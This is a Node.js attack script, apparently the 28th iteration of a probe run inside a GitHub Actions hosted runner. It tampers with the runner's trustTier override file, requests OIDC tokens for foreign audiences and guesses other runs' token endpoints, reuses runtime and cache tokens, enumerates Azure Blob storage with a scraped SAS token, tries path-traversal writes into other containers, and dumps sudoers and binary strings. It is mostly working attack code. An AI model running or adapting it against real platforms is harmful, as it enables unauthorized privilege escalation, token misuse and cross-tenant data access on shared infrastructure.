const https = require('https');
const fs = require('fs');
const { execSync } = require('child_process');

// v28: provjobd_override.json trustTier tamper + OIDC cross-audience + corrected cache auth
// Key v27 findings:
//   HCA does NOT re-read .settings (delta: 0 in 4s window) — URL cached in memory at startup
//   Per-run job service uses HMAC (not JWT) — ephemeral, not accessible from filesystem
//   SAS writes HTTP 201 — confirmed across VMs/containers (new container each job)
//   HCA log reveals: "Wrote abuse tools override file","trustTier":"2","path":"/opt/hca/provjobd_override.json"
//   provjobd_override.json is NEW attack surface — check if world-writable
//   OIDC URL: https://run-actions-1-azure-eastus.actions.githubusercontent.com/217//idtoken/...
//   Cache service token is URL-path embedded, NOT Bearer header (v27 used wrong auth format)

function run(cmd) {
  try { return execSync(cmd, { encoding: 'utf8', timeout: 10000 }).trim(); }
  catch(e) { return 'ERR: ' + (e.stderr || e.message || '').substring(0, 200).trim(); }
}

function httpReq(hostname, path, method, bearerToken, body, extraHeaders) {
  return new Promise((resolve) => {
    const hdrs = { 'User-Agent': 'GitHubActionsRunner/2.335.1', 'Accept': 'application/json', ...(extraHeaders || {}) };
    if (bearerToken) hdrs['Authorization'] = 'Bearer ' + bearerToken;
    let data = null;
    if (body) {
      data = typeof body === 'string' ? body : JSON.stringify(body);
      hdrs['Content-Type'] = extraHeaders && extraHeaders['Content-Type'] ? extraHeaders['Content-Type'] : 'application/json';
      hdrs['Content-Length'] = Buffer.byteLength(data);
    }
    const r = https.request({ hostname, path, method: method || 'GET', headers: hdrs, timeout: 12000 },
      (res) => { let d = ''; res.on('data', c => d += c); res.on('end', () => resolve({ status: res.statusCode, body: d.substring(0, 1000), headers: res.headers })); });
    r.on('error', e => resolve({ status: 'ERR', body: e.message }));
    r.on('timeout', () => { r.destroy(); resolve({ status: 'TIMEOUT', body: '' }); });
    if (data) r.write(data);
    r.end();
  });
}

async function main() {
  console.log('=== V28: provjobd_override.json + OIDC + corrected cache auth + /opt/hca/ audit ===');

  const settings = JSON.parse(fs.readFileSync('/opt/hca/.settings', 'utf8'));
  const OIDC_URL = process.env.ACTIONS_ID_TOKEN_REQUEST_URL || '';
  const OIDC_TOKEN = process.env.ACTIONS_ID_TOKEN_REQUEST_TOKEN || '';
  const RUNTIME_TOKEN = process.env.ACTIONS_RUNTIME_TOKEN || '';

  console.log('[INIT] OIDC_URL:', OIDC_URL.substring(0, 150));
  console.log('[INIT] OIDC_TOKEN present:', OIDC_TOKEN.length > 0, '(len=' + OIDC_TOKEN.length + ')');
  console.log('[INIT] RUNTIME_TOKEN present:', RUNTIME_TOKEN.length > 0, '(len=' + RUNTIME_TOKEN.length + ')');

  // === PART 1: /opt/hca/provjobd_override.json — the new attack surface ===
  console.log('\n=== PART 1: /opt/hca/provjobd_override.json audit ===');
  const overridePath = '/opt/hca/provjobd_override.json';
  console.log('[OVERRIDE] File stat:');
  console.log(run('stat ' + overridePath + ' 2>/dev/null'));
  console.log('[OVERRIDE] File permissions:');
  console.log(run('ls -la ' + overridePath + ' 2>/dev/null'));

  let overrideContent = null;
  try {
    overrideContent = fs.readFileSync(overridePath, 'utf8');
    console.log('[OVERRIDE] Content (READABLE):');
    console.log(overrideContent);
    const parsed = JSON.parse(overrideContent);
    console.log('[OVERRIDE] Parsed keys:', Object.keys(parsed).join(', '));
    console.log('[OVERRIDE] trustTier value:', parsed.trustTier);
    console.log('[OVERRIDE] Full parsed:', JSON.stringify(parsed, null, 2));
  } catch(e) {
    console.log('[OVERRIDE] Read ERROR:', e.message);
  }

  // Test writability
  if (overrideContent !== null) {
    try {
      const parsed = JSON.parse(overrideContent);
      const originalTier = parsed.trustTier;
      console.log('\n[OVERRIDE_WRITE] Attempting write test (same content)...');
      fs.writeFileSync(overridePath, overrideContent, 'utf8');
      console.log('[OVERRIDE_WRITE] *** WRITABLE! *** overrideContent written back successfully');

      // Test: modify trustTier from 2 to 0 (higher trust?) and see if anything changes
      // Do this BRIEFLY — restore immediately after
      console.log('[OVERRIDE_WRITE] Testing trustTier modification...');
      const modifiedContent = JSON.stringify(Object.assign({}, parsed, { trustTier: 0 }));
      fs.writeFileSync(overridePath, modifiedContent, 'utf8');
      console.log('[OVERRIDE_WRITE] Modified trustTier: ' + originalTier + ' → 0');
      console.log('[OVERRIDE_WRITE] Current content:', fs.readFileSync(overridePath, 'utf8'));

      // Check HCA log for any response to the modification
      const hcaBefore = fs.readFileSync('/opt/hca/logs/hosted-compute-agent.log', 'utf8').split('\n').length;
      await new Promise(r => setTimeout(r, 2000));
      const hcaAfter = fs.readFileSync('/opt/hca/logs/hosted-compute-agent.log', 'utf8').split('\n').length;
      console.log('[OVERRIDE_WRITE] HCA log delta after trustTier change:', hcaAfter - hcaBefore);

      // Restore original
      fs.writeFileSync(overridePath, overrideContent, 'utf8');
      console.log('[OVERRIDE_WRITE] Original content restored. trustTier back to:', originalTier);

      // Verify restore
      const restoredParsed = JSON.parse(fs.readFileSync(overridePath, 'utf8'));
      console.log('[OVERRIDE_WRITE] Verified restore trustTier:', restoredParsed.trustTier, restoredParsed.trustTier == originalTier ? '✓' : '✗ MISMATCH');
    } catch(e) {
      console.log('[OVERRIDE_WRITE] Write ERROR:', e.message, '(file may be read-only)');
    }
  }

  // === PART 2: Full /opt/hca/ directory audit ===
  console.log('\n=== PART 2: /opt/hca/ complete directory audit ===');
  console.log('[HCA_DIR] All files with permissions:');
  console.log(run('find /opt/hca -type f -exec ls -la {} \\; 2>/dev/null'));
  console.log('\n[HCA_DIR] Directory permissions:');
  console.log(run('find /opt/hca -type d -exec ls -lad {} \\; 2>/dev/null'));

  // Check every file in /opt/hca/ for readability and writability
  const hcaFiles = run('find /opt/hca -type f 2>/dev/null').split('\n').filter(Boolean);
  console.log('\n[HCA_FILES] All files in /opt/hca/:');
  for (const f of hcaFiles) {
    try {
      const stat = fs.statSync(f);
      const mode = (stat.mode & 0o777).toString(8);
      const readable = (() => { try { fs.accessSync(f, fs.constants.R_OK); return true; } catch(e) { return false; } })();
      const writable = (() => { try { fs.accessSync(f, fs.constants.W_OK); return true; } catch(e) { return false; } })();
      console.log('[HCA_FILES]  ' + f + ' | mode=' + mode + ' | size=' + stat.size + ' | readable=' + readable + ' | writable=' + writable);
    } catch(e) {
      console.log('[HCA_FILES]  ' + f + ' | ERROR: ' + e.message);
    }
  }

  // === PART 3: OIDC cross-audience test ===
  console.log('\n=== PART 3: OIDC endpoint — correct format + cross-audience test ===');
  // Standard OIDC request: GET {URL}&audience={aud} with Authorization: Bearer {OIDC_TOKEN}
  // OIDC_URL is ACTIONS_ID_TOKEN_REQUEST_URL
  if (OIDC_URL && OIDC_TOKEN) {
    const oidcUrlObj = new URL(OIDC_URL);
    const oidcHost = oidcUrlObj.hostname;
    const oidcBasePath = oidcUrlObj.pathname + oidcUrlObj.search;

    // Test 1: Standard request (default audience)
    console.log('[OIDC] Standard request (default audience):');
    const stdR = await httpReq(oidcHost, oidcBasePath, 'GET', OIDC_TOKEN);
    console.log('[OIDC] Status:', stdR.status, '| Body:', stdR.body.substring(0, 300));
    if (stdR.status === 200) {
      try {
        const tokenData = JSON.parse(stdR.body);
        if (tokenData.value) {
          const parts = tokenData.value.split('.');
          const payload = JSON.parse(Buffer.from(parts[1], 'base64url').toString());
          console.log('[OIDC] Token sub:', payload.sub);
          console.log('[OIDC] Token aud:', payload.aud);
          console.log('[OIDC] Token iss:', payload.iss);
          console.log('[OIDC] Token repository:', payload.repository);
          console.log('[OIDC] Token repository_owner:', payload.repository_owner);
          console.log('[OIDC] Token runner_environment:', payload.runner_environment);
          console.log('[OIDC] Full payload keys:', Object.keys(payload).join(', '));
        }
      } catch(e) { console.log('[OIDC] Token decode error:', e.message); }
    }

    // Test 2: Custom audience — another org
    const sep = oidcBasePath.includes('?') ? '&' : '?';
    const customAudiences = [
      'https://github.com/github',           // GitHub's own org
      'sts.amazonaws.com',                   // AWS STS
      'https://github.com/octocat',          // Another random org
      'https://token.actions.githubusercontent.com', // GitHub's OIDC issuer itself
    ];

    for (const aud of customAudiences) {
      const encodedAud = encodeURIComponent(aud);
      const audPath = oidcBasePath + sep + 'audience=' + encodedAud;
      const audR = await httpReq(oidcHost, audPath, 'GET', OIDC_TOKEN);
      console.log('[OIDC_AUD] audience=' + aud + ': ' + audR.status);
      if (audR.status === 200) {
        try {
          const td = JSON.parse(audR.body);
          if (td.value) {
            const p = JSON.parse(Buffer.from(td.value.split('.')[1], 'base64url').toString());
            console.log('[OIDC_AUD]   sub:', p.sub, '| aud:', p.aud, '| repo:', p.repository);
            // If aud contains another org's name → CRITICAL
            if (p.repository_owner !== 'Zelys-DFKH') {
              console.log('[OIDC_AUD] *** CROSS-OWNER TOKEN *** owner differs from Zelys-DFKH!');
            }
          }
        } catch(e) { console.log('[OIDC_AUD]   decode error:', e.message); }
      }
    }

    // Test 3: Try to call ANOTHER RUN's OIDC endpoint
    // Extract our orch_id and construct URLs with different job IDs
    // Our URL: .../idtoken/{orch-id}/{attempt-id}?api-version=2.0
    // Try replacing attempt-id with common UUIDs
    const oidcPathParts = oidcBasePath.match(/\/idtoken\/([a-f0-9-]+)\/([a-f0-9-]+)/);
    if (oidcPathParts) {
      const orchId = oidcPathParts[1];
      const attemptId = oidcPathParts[2];
      console.log('\n[OIDC_CROSS] Our orch_id:', orchId);
      console.log('[OIDC_CROSS] Our attempt_id:', attemptId);

      // Try with all zeros (null UUID)
      const nullAttemptPath = oidcBasePath.replace(attemptId, '00000000-0000-0000-0000-000000000000');
      const nullR = await httpReq(oidcHost, nullAttemptPath, 'GET', OIDC_TOKEN);
      console.log('[OIDC_CROSS] GET with null attempt_id:', nullR.status, '|', nullR.body.substring(0, 100));

      // Try with incremented UUID (1 → 2 in the orch_id)
      const modOrchPath = oidcBasePath.replace(orchId, orchId.replace(/[0-9a-f]+$/, 'ffffffff'));
      const modOrchR = await httpReq(oidcHost, modOrchPath, 'GET', OIDC_TOKEN);
      console.log('[OIDC_CROSS] GET with modified orch_id:', modOrchR.status, '|', modOrchR.body.substring(0, 100));
    }
  } else {
    console.log('[OIDC] OIDC_URL or OIDC_TOKEN not available in environment');
    console.log('[OIDC] OIDC_URL env:', OIDC_URL.substring(0, 100));
    console.log('[OIDC] OIDC_TOKEN present:', OIDC_TOKEN.length > 0);
  }

  // === PART 4: Cache service with CORRECT auth format ===
  // v27 mistake: used Authorization: Bearer header AND embedded URL token
  // Correct: token is the URL path ONLY — no Authorization header needed for most operations
  // OR: use RUNTIME_TOKEN as Bearer with the base cache URL (no path token)
  console.log('\n=== PART 4: Artifact cache service — correct auth format ===');
  const workerLogPath = run('find /home/runner/actions-runner/cached/2.335.1/_diag -name "Worker_*.log" 2>/dev/null | head -1');
  let cacheUrlBase = '';
  if (workerLogPath && !workerLogPath.startsWith('ERR:')) {
    const logContent = fs.readFileSync(workerLogPath, 'utf8');
    const match = logContent.match(/CacheServerUrl["\s:]+\"?(https?:\/\/artifactcache\.actions\.githubusercontent\.com\/[A-Za-z0-9+/=_-]+\/)/);
    if (match) cacheUrlBase = match[1];
  }
  const envCacheUrl = process.env.ACTIONS_CACHE_URL || '';
  const finalCacheUrl = cacheUrlBase || envCacheUrl;
  console.log('[CACHE] Cache URL from Worker log:', cacheUrlBase.substring(0, 100));
  console.log('[CACHE] ACTIONS_CACHE_URL env:', envCacheUrl.substring(0, 100));

  if (finalCacheUrl) {
    const cacheUrlObj = new URL(finalCacheUrl);
    const cacheHost = cacheUrlObj.hostname;
    const cacheTokenPath = cacheUrlObj.pathname.replace(/\/$/, '');
    const cacheToken = cacheTokenPath.replace('/', '');

    // Format 1: URL-path token, no auth header (how runner normally uses it)
    const noAuthPaths = [
      cacheTokenPath + '/_apis/artifactcache/caches?keys=probe-v10&version=v1',
      cacheTokenPath + '/_apis/artifactcache/caches?keys=&version=v1',
      cacheTokenPath + '/_apis/artifactcache/caches',
    ];
    for (const path of noAuthPaths) {
      const r = await httpReq(cacheHost, path, 'GET', null, null,
        { 'Accept': 'application/json;api-version=6.0-preview' });
      if (r.status !== 'ERR') {
        const label = (r.status === 200) ? ' *** SUCCESS ***' : '';
        console.log('[CACHE_NOAUTH] GET ' + path.substring(0, 80) + ': ' + r.status + label + ' | ' + r.body.substring(0, 200));
      }
    }

    // Format 2: RUNTIME_TOKEN as Bearer with base cache URL (no path token)
    // The runner cache service may accept RUNTIME_TOKEN instead of URL token
    if (RUNTIME_TOKEN) {
      const cacheBaseHost = 'artifactcache.actions.githubusercontent.com';
      const r2 = await httpReq(cacheBaseHost, '/_apis/artifactcache/caches?keys=probe-v10&version=v1', 'GET', RUNTIME_TOKEN,
        null, { 'Accept': 'application/json;api-version=6.0-preview' });
      console.log('[CACHE_RUNTIME] GET with RUNTIME_TOKEN (no path token):', r2.status, '|', r2.body.substring(0, 200));
    }

    // Format 3: Try Twirp with RUNTIME_TOKEN (known format from v7-v14 probes)
    // From earlier probes: results-receiver.actions.githubusercontent.com accepts RUNTIME_TOKEN
    const twirpBody = JSON.stringify({ key: 'node-', version: 'v1' });
    if (RUNTIME_TOKEN) {
      const twirpR = await httpReq('results-receiver.actions.githubusercontent.com',
        '/twirp/github.actions.results.api.v1.CacheService/GetCacheEntryDownloadURL',
        'POST', RUNTIME_TOKEN, twirpBody, { 'Content-Type': 'application/json' });
      console.log('[CACHE_TWIRP_RT] POST to results-receiver with RUNTIME_TOKEN:', twirpR.status, '|', twirpR.body.substring(0, 200));
    }
  }

  // === PART 5: Azure Blob SAS account-level enumeration ===
  console.log('\n=== PART 5: SAS account-level container enumeration ===');
  const sasUri = settings.diagnosticsSasUri;
  if (sasUri) {
    const sasUrl = new URL(sasUri);
    const blobHost = sasUrl.hostname;
    const sasToken = sasUrl.search; // ?se=...&sig=...&sp=acw...

    // The SAS token has sp=acw on sr=c (container-scoped)
    // Try account-level operations by removing the container path and adding restype=account
    const accountBase = sasUrl.origin; // https://hcrpprodiad01diag.blob.core.windows.net

    // Try listing ALL containers (account-level — requires sp=l at account level)
    const listContainerPaths = [
      '/' + sasToken.replace('?', '') + '&comp=list&restype=account',
      '/?comp=list' + sasToken,
      '/?' + sasToken.replace('?', '') + '&comp=list',
      '/?comp=list&include=metadata&restype=account' + sasToken,
    ];
    for (const path of listContainerPaths) {
      const r = await new Promise((resolve) => {
        const req = https.request({ hostname: blobHost, path: path, method: 'GET', headers: { 'User-Agent': 'probe', 'x-ms-version': '2025-01-05' }, timeout: 8000 },
          (res) => { let d = ''; res.on('data', c => d += c); res.on('end', () => resolve({ status: res.statusCode, body: d.substring(0, 500) })); });
        req.on('error', e => resolve({ status: 'ERR', body: e.message }));
        req.on('timeout', () => { req.destroy(); resolve({ status: 'TIMEOUT', body: '' }); });
        req.end();
      });
      console.log('[SAS_ENUM] GET ' + path.substring(0, 80) + ': ' + r.status + ' | ' + r.body.substring(0, 200));
    }

    // Try listing the container itself (even though sp=acw doesn't include l, test)
    const containerListPath = sasUrl.pathname + sasUrl.search + '&restype=container&comp=list';
    const contR = await new Promise((resolve) => {
      const req = https.request({ hostname: blobHost, path: containerListPath, method: 'GET', headers: { 'User-Agent': 'probe' }, timeout: 8000 },
        (res) => { let d = ''; res.on('data', c => d += c); res.on('end', () => resolve({ status: res.statusCode, body: d.substring(0, 300) })); });
      req.on('error', e => resolve({ status: 'ERR', body: e.message }));
      req.on('timeout', () => { req.destroy(); resolve({ status: 'TIMEOUT', body: '' }); });
      req.end();
    });
    console.log('[SAS_CONT_LIST] Container list (our container):', contR.status, '|', contR.body.substring(0, 200));

    // Write to different blob paths to test if we can access OTHER containers
    // The SAS is sr=c (container-scoped) — try to escape with path traversal
    const traversalBlobPaths = [
      sasUrl.pathname.replace(/\/[^/]+$/, '/') + '../other-container/test.txt' + sasUrl.search,
      sasUrl.pathname + '/../' + 'other-container/test.txt' + sasUrl.search,
      sasUrl.pathname.replace(/^\/[^/]+/, '/') + '/escape-test.txt' + sasUrl.search,
    ];
    for (const blobPath of traversalBlobPaths) {
      const body = Buffer.from('traversal-test');
      const r = await new Promise((resolve) => {
        const req = https.request({ hostname: blobHost, path: blobPath, method: 'PUT',
          headers: { 'Content-Type': 'text/plain', 'Content-Length': body.length, 'x-ms-blob-type': 'BlockBlob', 'User-Agent': 'probe' }, timeout: 5000 },
          (res) => { let d = ''; res.on('data', c => d += c); res.on('end', () => resolve({ status: res.statusCode, body: d.substring(0, 200) })); });
        req.on('error', e => resolve({ status: 'ERR', body: e.message }));
        req.on('timeout', () => { req.destroy(); resolve({ status: 'TIMEOUT', body: '' }); });
        req.write(body);
        req.end();
      });
      console.log('[SAS_TRAVERSAL] PUT ' + blobPath.substring(0, 80) + ': ' + r.status + ' | ' + r.body.substring(0, 100));
    }
  }

  // === PART 6: /opt/hca/provjobd_override.json — deeper analysis ===
  console.log('\n=== PART 6: provjobd_override.json — abuse tools analysis ===');
  // Check what "abuse tools" process is running and what it does
  console.log('[ABUSE] Abuse tools processes:');
  console.log(run('ps -eo pid,ppid,cmd --no-headers | grep -i "provjobd\\|abuse\\|sudo" | grep -v grep | head -20'));
  console.log('[ABUSE] Abuse tools files in /opt/hca/:');
  console.log(run('find /opt/hca -name "*provjobd*" -o -name "*abuse*" 2>/dev/null | xargs ls -la 2>/dev/null'));
  console.log('[ABUSE] What runs with sudo (sudoers):');
  console.log(run('cat /etc/sudoers 2>/dev/null || cat /etc/sudoers.d/* 2>/dev/null | head -30'));
  console.log('[ABUSE] HCA binary linked libraries (for understanding provjobd):');
  console.log(run('ldd /opt/hca/hosted-compute-agent 2>/dev/null | head -20'));
  // Check provjobd binary if it exists
  console.log('[ABUSE] Provjobd binary:');
  console.log(run('find / -name "provjobd" -o -name "provjobd_*" 2>/dev/null | head -5'));
  console.log('[ABUSE] Strings in /opt/hca (abuse-tool related):');
  console.log(run('strings /opt/hca/hosted-compute-agent 2>/dev/null | grep -i "provjobd\\|trustTier\\|trust_tier\\|abuse\\|override" | head -20'));

  // === PART 7: Enumerate internal services from HCA binary ===
  console.log('\n=== PART 7: HCA binary internal endpoint strings ===');
  console.log('[HCA_STR] All HTTP/HTTPS URLs in HCA binary:');
  console.log(run('strings /opt/hca/hosted-compute-agent 2>/dev/null | grep -iE "^https?://" | sort -u | head -30'));
  console.log('[HCA_STR] Scheduler/orchestrator paths:');
  console.log(run('strings /opt/hca/hosted-compute-agent 2>/dev/null | grep -iE "scheduler|orchestrat|request|acquire|complete|result|trace|watchdog" | sort -u | head -30'));

  // === PART 8: Final SAS write and HCA log ===
  console.log('\n=== PART 8: Final evidence write + HCA log ===');
  const finalSasUri = settings.diagnosticsSasUri;
  if (finalSasUri) {
    const fu = new URL(finalSasUri);
    const ts = Date.now();
    const blobPath = fu.pathname + '/probe-v28-' + ts + '.txt' + fu.search;
    const body = Buffer.from('v28 probe ' + ts + ' — provjobd+OIDC+cache investigation');
    const wr = await new Promise((resolve) => {
      const r = https.request({ hostname: fu.hostname, path: blobPath, method: 'PUT',
        headers: { 'Content-Type': 'text/plain', 'Content-Length': body.length, 'x-ms-blob-type': 'BlockBlob' } },
        (res) => { let d = ''; res.on('data', c => d += c); res.on('end', () => resolve({ status: res.statusCode })); });
      r.on('error', e => resolve({ status: 'ERR' }));
      r.setTimeout(5000, () => { r.destroy(); resolve({ status: 'TIMEOUT' }); });
      r.write(body);
      r.end();
    });
    console.log('[SAS_FINAL] PUT probe-v28-' + ts + '.txt:', wr.status, wr.status === 201 ? '*** WRITE CONFIRMED ***' : '');
  }

  console.log('[HCA_FINAL] Final HCA log (last 20 lines):');
  const hcaLog = fs.readFileSync('/opt/hca/logs/hosted-compute-agent.log', 'utf8');
  hcaLog.split('\n').slice(-20).filter(l => l.trim()).forEach(l => console.log('  ' + l.substring(0, 250)));

  console.log('\n=== V28 Complete ===');
}

main().catch(e => console.log('Fatal:', e.message, e.stack));
